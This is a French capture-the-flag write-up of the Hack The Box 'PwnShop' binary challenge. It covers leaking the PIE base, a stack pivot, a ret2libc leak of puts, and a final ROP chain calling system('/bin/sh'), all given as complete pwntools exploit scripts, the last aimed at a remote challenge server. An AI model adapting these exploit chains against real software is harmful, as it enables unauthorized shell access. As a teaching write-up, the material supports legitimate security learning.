# PwnShop [Pwn] Challenge

`—- File Type -—`

Nous avons un ELF 64 bits Linux ayant 2 sécurité NX et PIE.  NX nous empêche d’exécuter du code dans le stack et PIE alloue les adresse aléatoirement ce qui ne nous permet pas de prévoir à l’avance sur qu’elle adresse rebondir.

Le programme est plutôt simple nous avons 3 choix nous avons le droit à 8 caractère d’entré.

Dans ghidra nous voyons que la limite de 8 n’est pas respécté dans toutes les entrées. Le read avant “How much do you want to pay for it” lis 30  ce qui est un buffer overflow.

Une autre chose étrange est le Sell quand nous mettons 8 caractère dedans nous avons un retour spécial.

Une entré “12345678” nous avons ceci en retour :

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled.png)

Nous pouvons répéter cette erreur de plusieurs façon en ayant des caractères différent à chaque fois ce que nous pouvons comprendre de cela c’est nous écrivons sur une adresse différente à chaque fois. Pour résoudre ce chall il faut leak l’adresse du programme.

`—- Leaking binary address -—`

Dans ghidra il y a in appel à un pointeur sur local_20 pointeur qui est dans un read du programme.

A partir de la nous pouvons essayer d’obtenir un offset avec ce script :

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./pwnshop')

        #STEP 1 Leak binary address

        io.sendlineafter('\n> ', '2')
        io.sendlineafter('What do you wish to sell? ', '')
        leak_padding = b'1'*8
        io.sendafter('How much do you want for it? ', leak_padding)

        binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
        binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
        binary_offset = u64(binary_offset, endian='little')
        binary_offset -= 0x40c0
        log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

if __name__ == '__main__':
        main()
```

Nous allons mettre un padding a 8 caractères et prendre les caractères inconnu pour les transformé en adresse.

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%201.png)

On voit avec ces 3 exécutions que les adresses sont réalloué à chaque lancement.

Un autre buffer Overflow est dans le buy ou nous avons une entré de 50 places avec un allocation de 72.

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%202.png)

Essayons de trigger le défaut de segmentation

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%203.png)

Ca marche nous pouvons passer à la suite.

`—- Overflow et stack pivot -—`

Pour pivoter nous avons besoin de revenir en arrière dans le programme pour soustraire RSP et ensuite avoir un return. Ce qui nous permettra d’avoir plus d’espace pour travailler.

`ROPgadget --binary pwnshop --only “sub|ret”`

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%204.png)

Nous pouvons améliorer notre exploit et maintenant il ressemble à cela :

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./pwnshop')

        #STEP 1 Leak binary address

        io.sendlineafter('\n> ', '2')
        io.sendlineafter('What do you wish to sell? ', '')
        leak_padding = b'1'*8
        io.sendafter('How much do you want for it? ', leak_padding)

        binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
        binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
        binary_offset = u64(binary_offset, endian='little')
        binary_offset -= 0x40c0
        log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

        #STEP 2 Stack Pivot
        padding_to_rop_chain = b'a'*40
        sell_function = p64(0x126a + binary_offset) #0x126a est l'adresse de la fonction sell
        
        rop_chain = sell_function + sell_function
        padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
        sub_rsp = p64(0x1219 + binary_offset) #0x1219 venant de ROPGadget

        payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
        print(payload)

        io.sendlineafter('\n> ', '1')
        io.sendafter('Enter details: ', payload)
        
        io.interactive()

if __name__ == '__main__':
        main()
```

L’exploit va nous permettre de créé plus de place pour nos entrés en utilisant le stack pivot.

`—- Return to Libc -—`

L’objectif maintenant est de trouver libc dans le programme qui pourra nous donner accès au système.

Nous devons trouver le pointeur qui nous amène à libc.

 Retournons sur gidhra et cliquons dans Program Trees .got.plt

Nous allons prendre l’adresse de puts et l’adresse pointeur XREF de la fonction puts et si nous suivons cette adresse nous pouvons voir ou est créé puts.

Mise à jour de l’exploit nous permettant d’obtenir l’adresse leak de Libc :

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./pwnshop')

        #STEP 1 Leak binary address

        io.sendlineafter('\n> ', '2')
        io.sendlineafter('What do you wish to sell? ', '')
        leak_padding = b'1'*8
        io.sendafter('How much do you want for it? ', leak_padding)

        binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
        binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
        binary_offset = u64(binary_offset, endian='little')
        binary_offset -= 0x40c0
        log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

        #STEP 2 Stack Pivot

        got_puts = p64(binary_offset + 0x4018) #Adresse de puts lien pointeur mémoire
        plt_puts = p64(binary_offset + 0x1030) #Adresse du pointeur de puts
        pop_rdi = p64(binary_offset + 0x13c3) #Adresse d'un pop rdi qui nous permet de ne pas juste crash
        buy_function = p64(binary_offset + 0x132a) #Adresse de la fonction buy
        padding_to_rop_chain = b'a'*40

        rop_chain = pop_rdi + got_puts + plt_puts + buy_function
        padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
        sub_rsp = p64(0x1219 + binary_offset) #0x1219 venant de ROPGadget

        payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
        print(payload)

        io.sendlineafter('\n> ', '1')
        io.sendafter('Enter details: ', payload)

        leaked_puts_libc = io.recvline()[:6]
        leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
        leaked_puts_libc = u64(leaked_puts_libc, endian='little')
        log.success(f'Leaked puts@GLIBCL Offset: {str(hex(leaked_puts_libc))}')

        io.interactive()

if __name__ == '__main__':
        main()
```

`—- Final Exploit -—`

Pour le dernier exploit du programme nous allons avoir besoin de savoir ou est stocké le système et ou est /bin/sh nous voullons le pop et l’utiliser en atnt qu’argument.

Pour connaitre la lib utilisé par le programme nous faisons `ldd pwnshop`

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%205.png)

Ensuite nous allons voir les utilisations de cette librairie de puts :

`readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts` 

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%206.png)

L’adresse que nous avons leak pendant notre exploit juste avant est le 441 nous avons donc son adresse 75e10

Ils nous faut d’autres adresse pour réaliser cette exploit system et /bin/sh :

system : `readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system`

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%207.png)

/bin/sh : `strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh`

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%208.png)

L’exploit ressemble maintenant à cela :

```python
#!/usr/bin/env python3

from pwn import *

def main():
        io = process('./pwnshop')

        #STEP 1 Leak binary address

        io.sendlineafter('\n> ', '2')
        io.sendlineafter('What do you wish to sell? ', '')
        leak_padding = b'1'*8
        io.sendafter('How much do you want for it? ', leak_padding)

        binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
        binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
        binary_offset = u64(binary_offset, endian='little')
        binary_offset -= 0x40c0
        log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

        #STEP 2 Stack Pivot

        got_puts = p64(binary_offset + 0x4018) #Adresse de puts lien pointeur mémoire
        plt_puts = p64(binary_offset + 0x1030) #Adresse du pointeur de puts
        pop_rdi = p64(binary_offset + 0x13c3) #Adresse d'un pop rdi qui nous permet de ne pas juste crash
        buy_function = p64(binary_offset + 0x132a) #Adresse de la fonction buy
        padding_to_rop_chain = b'a'*40

        rop_chain = pop_rdi + got_puts + plt_puts + buy_function
        padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
        sub_rsp = p64(0x1219 + binary_offset) #0x1219 venant de ROPGadget

        payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
        print(payload)

        io.sendlineafter('\n> ', '1')
        io.sendafter('Enter details: ', payload)

        leaked_puts_libc = io.recvline()[:6]
        leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
        leaked_puts_libc = u64(leaked_puts_libc, endian='little')
        log.success(f'Leaked puts@GLIBCL Offset: {str(hex(leaked_puts_libc))}')

        #Find offset in LIBC
        libc_puts = 0x75e10  #ou 0x765f0
				libc_system = 0x49860 #ou 0x48e50
        libc_sh = 0x198882 #ou 18a156

        libc_offset = leaked_puts_libc - libc_puts

        system = p64(libc_offset + libc_system)
        log.info(f'Calculated System Location: {str(hex(u64(system)))}')
        sh = p64(libc_offset + libc_sh)
        log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')

        io.interactive()

if __name__ == '__main__':
        main()
```

Avec ça nous somme capable de calculé l’adresse system et sh.

Et avec le code exploit notre exploit local ressemble à cela

```python
#!/usr/bin/env python3

from pwn import *

def main():
	io = process('./pwnshop')

	#STEP 1 Leak binary address

	io.sendlineafter('\n> ', '2')
	io.sendlineafter('What do you wish to sell? ', '')
	leak_padding = b'1'*8
	io.sendafter('How much do you want for it? ', leak_padding)

	binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
	binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
	binary_offset = u64(binary_offset, endian='little')
	binary_offset -= 0x40c0
	log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

	#STEP 2 Stack Pivot

	got_puts = p64(binary_offset + 0x4018) #Adresse de puts lien pointeur mémoire
	plt_puts = p64(binary_offset + 0x1030) #Adresse du pointeur de puts
	pop_rdi = p64(binary_offset + 0x13c3) #Adresse d'un pop rdi qui nous permet de ne pas juste crash
	buy_function = p64(binary_offset + 0x132a) #Adresse de la fonction buy
	padding_to_rop_chain = b'a'*40

	rop_chain = pop_rdi + got_puts + plt_puts + buy_function
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	sub_rsp = p64(0x1219 + binary_offset) #0x1219 venant de ROPGadget

	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
	print(payload)

	io.sendlineafter('\n> ', '1')
	io.sendafter('Enter details: ', payload)

	leaked_puts_libc = io.recvline()[:6]
	leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
	leaked_puts_libc = u64(leaked_puts_libc, endian='little')
	log.success(f'Leaked puts@GLIBCL Offset: {str(hex(leaked_puts_libc))}')

	#Find offset in LIBC
	libc_puts = 0x75e10  #ou 0x765f0
	libc_system = 0x49860 #ou 0x48e50
	libc_sh = 0x198882 #ou 18a156

	libc_offset = leaked_puts_libc - libc_puts

	system = p64(libc_offset + libc_system)
	log.info(f'Calculated System Location: {str(hex(u64(system)))}')
	sh = p64(libc_offset + libc_sh)
	log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')

	#STEP 4 Exploit
	rop_chain = pop_rdi + sh + system
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'

	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp

	io.sendafter('Enter details: ', payload)

	io.interactive()

if __name__ == '__main__':
	main()
```

Si nous l’exécutons sur notre machine l’exploit nous donne les accès root de la machine.

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%209.png)

Le problème si nous essayons d’exécuter notre exploit marchant sur notre machine sur la machine distante est que nous n’avons pas le même alloue-ment de mémoire.

Nous n’aurons pas les même adresse et nous ne pourrons pas devenir root.

Pour devenir root sur leur machine nous pouvons utiliser les adresse que nous arrivons à leak et utiliser le site [https://libc.blukat.me/](https://libc.blukat.me/)

En mettant l’adresse que nous avons eu sur le site :

![Untitled](PwnShop%20%5BPwn%5D%20Challenge%20895ef805e6ed4a98889545f333366461/Untitled%2010.png)

Nous avons des matches et nous pouvons tester avec leurs adresse.

Dans cette version de HTB le serveur est un ubuntu11.2_amd64

On cherche donc les adresse dans le dictionnaire :

`puts` ; `system` ; `str_bin_sh`

Et nous eomplaçons de notre code les ancienne valeurs

L’Exploit Final :

```python
#!/usr/bin/env python3

from pwn import *

def main():
	io = remote("188.166.172.38", 30613)

	#STEP 1 Leak binary address

	io.sendlineafter('\n> ', '2')
	io.sendlineafter('What do you wish to sell? ', '')
	leak_padding = b'1'*8
	io.sendafter('How much do you want for it? ', leak_padding)

	binary_offset = io.recvline().split(b'1'*8)[1].split(b'?')[0]
	binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
	binary_offset = u64(binary_offset, endian='little')
	binary_offset -= 0x40c0
	log.success(f'Leaked Binary Offset: {str(hex(binary_offset))}')

	#STEP 2 Stack Pivot

	got_puts = p64(binary_offset + 0x4018) #Adresse de puts lien pointeur mémoire
	plt_puts = p64(binary_offset + 0x1030) #Adresse du pointeur de puts
	pop_rdi = p64(binary_offset + 0x13c3) #Adresse d'un pop rdi qui nous permet de ne pas juste crash
	buy_function = p64(binary_offset + 0x132a) #Adresse de la fonction buy
	padding_to_rop_chain = b'a'*40

	rop_chain = pop_rdi + got_puts + plt_puts + buy_function
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	sub_rsp = p64(0x1219 + binary_offset) #0x1219 venant de ROPGadget

	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
	print(payload)

	io.sendlineafter('\n> ', '1')
	io.sendafter('Enter details: ', payload)

	leaked_puts_libc = io.recvline()[:6]
	leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
	leaked_puts_libc = u64(leaked_puts_libc, endian='little')
	log.success(f'Leaked puts@GLIBCL Offset: {str(hex(leaked_puts_libc))}')

	#Find offset in LIBC
	libc_puts = 0x06f6a0
	libc_system = 0x0453a0
	libc_sh = 0x18ce17

	libc_offset = leaked_puts_libc - libc_puts

	system = p64(libc_offset + libc_system)
	log.info(f'Calculated System Location: {str(hex(u64(system)))}')
	sh = p64(libc_offset + libc_sh)
	log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')

	#STEP 4 Exploit
	rop_chain = pop_rdi + sh + system
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'

	payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp

	io.sendafter('Enter details: ', payload)

	io.interactive()

if __name__ == '__main__':
	main()
```

Nous pouvons maintenant récupérer le flag ! Mais il est possible qu’il y ai une fois de temps en temps une erreur et que nous devons relancer l’exploit.